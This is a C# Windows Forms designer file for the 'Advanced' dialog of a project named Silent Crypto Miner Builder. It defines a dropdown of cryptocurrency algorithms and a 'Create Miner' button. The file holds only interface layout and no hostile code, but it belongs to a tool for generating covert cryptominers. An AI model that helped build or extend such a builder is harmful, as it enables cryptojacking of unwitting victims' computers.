using System;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace SilentCryptoMiner
{
    [DesignerGenerated()]
    public partial class Advanced : Form
    {

        // Form overrides dispose to clean up the component list.
        [DebuggerNonUserCode()]
        protected override void Dispose(bool disposing)
        {
            try
            {
                if (disposing && components is object)
                {
                    components.Dispose();
                }
            }
            finally
            {
                base.Dispose(disposing);
            }
        }

        // Required by the Windows Form Designer
        private System.ComponentModel.IContainer components;

        // NOTE: The following procedure is required by the Windows Form Designer
        // It can be modified using the Windows Form Designer.  
        // Do not modify it using the code editor.
        [DebuggerStepThrough()]
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Advanced));
            this.TooltipHelper = new System.Windows.Forms.ToolTip(this.components);
            this.Label3 = new System.Windows.Forms.Label();
            this.MephTheme1 = new MephTheme();
            this.Label1 = new System.Windows.Forms.Label();
            this.comboAlgorithm = new MephComboBox();
            this.btnCreate = new MephButton();
            this.MephTheme1.SuspendLayout();
            this.SuspendLayout();
            // 
            // TooltipHelper
            // 
            this.TooltipHelper.AutoPopDelay = 32000;
            this.TooltipHelper.BackColor = System.Drawing.Color.White;
            this.TooltipHelper.ForeColor = System.Drawing.Color.Black;
            this.TooltipHelper.InitialDelay = 100;
            this.TooltipHelper.IsBalloon = true;
            this.TooltipHelper.ReshowDelay = 100;
            // 
            // Label3
            // 
            this.Label3.AutoSize = true;
            this.Label3.BackColor = System.Drawing.Color.Transparent;
            this.Label3.Cursor = System.Windows.Forms.Cursors.Help;
            this.Label3.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Underline);
            this.Label3.ForeColor = System.Drawing.Color.Teal;
            this.Label3.Location = new System.Drawing.Point(264, 110);
            this.Label3.Name = "Label3";
            this.Label3.Size = new System.Drawing.Size(13, 13);
            this.Label3.TabIndex = 93;
            this.Label3.Text = "?";
            this.TooltipHelper.SetToolTip(this.Label3, "Choose a cryptocurrency (algorithm) to mine.\r\nIf you cannot find the coin you wan" +
        "t to mine then\r\nselect a coin with the same algorithm.");
            // 
            // MephTheme1
            // 
            this.MephTheme1.AccentColor = System.Drawing.Color.DarkRed;
            this.MephTheme1.Anchor = System.Windows.Forms.AnchorStyles.None;
            this.MephTheme1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(28)))), ((int)(((byte)(28)))), ((int)(((byte)(28)))));
            this.MephTheme1.Controls.Add(this.Label3);
            this.MephTheme1.Controls.Add(this.Label1);
            this.MephTheme1.Controls.Add(this.comboAlgorithm);
            this.MephTheme1.Controls.Add(this.btnCreate);
            this.MephTheme1.Font = new System.Drawing.Font("Segoe UI", 9.5F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(128)));
            this.MephTheme1.Location = new System.Drawing.Point(0, 0);
            this.MephTheme1.Name = "MephTheme1";
            this.MephTheme1.Size = new System.Drawing.Size(310, 187);
            this.MephTheme1.SubHeader = "Select a cryptocurrency (algorithm) to mine";
            this.MephTheme1.TabIndex = 0;
            this.MephTheme1.Text = "Silent Crypto Miner Builder";
            // 
            // Label1
            // 
            this.Label1.AutoSize = true;
            this.Label1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.Label1.ForeColor = System.Drawing.Color.Gray;
            this.Label1.Location = new System.Drawing.Point(56, 87);
            this.Label1.Name = "Label1";
            this.Label1.Size = new System.Drawing.Size(167, 17);
            this.Label1.TabIndex = 46;
            this.Label1.Text = "Cryptocurrency (algorithm):";
            // 
            // comboAlgorithm
            // 
            this.comboAlgorithm.BackColor = System.Drawing.Color.Transparent;
            this.comboAlgorithm.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.comboAlgorithm.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboAlgorithm.Font = new System.Drawing.Font("Verdana", 8F);
            this.comboAlgorithm.ForeColor = System.Drawing.Color.Silver;
            this.comboAlgorithm.FormattingEnabled = true;
            this.comboAlgorithm.ItemHeight = 16;
            this.comboAlgorithm.ItemHighlightColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(55)))), ((int)(((byte)(55)))));
            this.comboAlgorithm.Items.AddRange(new object[] {
            "Monero (rx/0 - RandomX)",
            "Ethereum (ethash)",
            "Ethereum Classic (etchash)",
            "---------------------",
            "2ACoin (argon2/chukwa - Argon2id Chukwa)",
            "ArQmA (rx/arq - RandomARQ)",
            "Blockcloud (cn-heavy/xhv - CryptoNight-Heavy-Haven)",
            "Callisto (ethash)",
            "Conceal (cn/ccx - CryptoNight-Conceal)",
            "Dero (astrobwt - AstroBWT)",
            "Dubaicoin (ethash)",
            "Electronero (cn/fast)",
            "ElectroneroXP (cn/fast)",
            "Ellaism (ethash)",
            "Ether-1 (ethash)",
            "Ethereum (ethash)",
            "Ethereum Classic (etchash)",
            "Expanse (ethash)",
            "Graft (rx/graft)",
            "Haven (cn-heavy/xhv - CryptoNight-Heavy-Haven)",
            "Iridium (cn-pico - CryptoNight-Pico)",
            "Keva (rx/keva - RandomKEVA)",
            "Masari (cn/half)",
            "Metaverse (ethash)",
            "Monero (rx/0 - RandomX)",
            "Nilu (ethash)",
            "NinjaCoin (argon2/ninja Argon2id NINJA)",
            "Pirl (ethash)",
            "Ravencoin (kawpow - KawPow)",
            "Safex (rx/sfx - RandomSFX)",
            "Sumokoin (cn/r - CryptoNightR)",
            "Talleo (cn-pico/tlo - CryptoNight-Pico)",
            "Turtlecoin (argon2/chukwav2 - Argon2id Chukwa v2)",
            "Ubiq (ethash)",
            "Uplexa (cn/upx2 - CryptoNight-Femto)",
            "Wownero (rx/wow - RandomWOW)",
            "(cn/zls)",
            "(cn/double)",
            "(cn/2)",
            "(cn/xao)",
            "(cn/rto)",
            "(cn/rwz)",
            "(cn-heavy/tube)",
            "(cn-heavy/0)",
            "(cn/1)",
            "(cn-lite/1)",
            "(cn-lite/0)",
            "(cn/0)"});
            this.comboAlgorithm.Location = new System.Drawing.Point(59, 107);
            this.comboAlgorithm.Name = "comboAlgorithm";
            this.comboAlgorithm.Size = new System.Drawing.Size(201, 22);
            this.comboAlgorithm.StartIndex = 0;
            this.comboAlgorithm.TabIndex = 45;
            // 
            // btnCreate
            // 
            this.btnCreate.BackColor = System.Drawing.Color.Transparent;
            this.btnCreate.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnCreate.Location = new System.Drawing.Point(207, 151);
            this.btnCreate.Name = "btnCreate";
            this.btnCreate.Size = new System.Drawing.Size(90, 23);
            this.btnCreate.TabIndex = 44;
            this.btnCreate.Text = "Create Miner";
            this.btnCreate.Click += new System.EventHandler(this.btnCreate_Click);
            // 
            // Advanced
            // 
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.None;
            this.ClientSize = new System.Drawing.Size(310, 187);
            this.Controls.Add(this.MephTheme1);
            this.Font = new System.Drawing.Font("Microsoft Sans Serif", 5.729167F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(128)));
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.MaximizeBox = false;
            this.MaximumSize = new System.Drawing.Size(436, 307);
            this.MinimizeBox = false;
            this.MinimumSize = new System.Drawing.Size(310, 187);
            this.Name = "Advanced";
            this.Opacity = 0.95D;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Advanced";
            this.TransparencyKey = System.Drawing.Color.Fuchsia;
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.advanced_FormClosing);
            this.MephTheme1.ResumeLayout(false);
            this.MephTheme1.PerformLayout();
            this.ResumeLayout(false);

        }

        internal MephTheme MephTheme1;
        internal ToolTip TooltipHelper;
        internal MephButton btnCreate;
        internal Label Label1;
        internal MephComboBox comboAlgorithm;
        internal Label Label3;
    }
}